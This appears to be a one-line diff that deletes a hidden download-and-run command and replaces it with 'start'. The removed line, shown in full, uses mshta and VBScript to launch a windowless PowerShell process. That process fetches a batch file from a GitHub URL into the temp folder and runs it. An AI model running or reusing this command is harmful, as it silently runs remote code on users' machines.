@@ -1,1 +1,1 @@
-mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell.exe -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/LilGorrillo/po/main/p.bat' -OutFile '%TEMP%\r.bat'; Start-Process '%TEMP%\r.bat'"", 0 : window.close")
+start
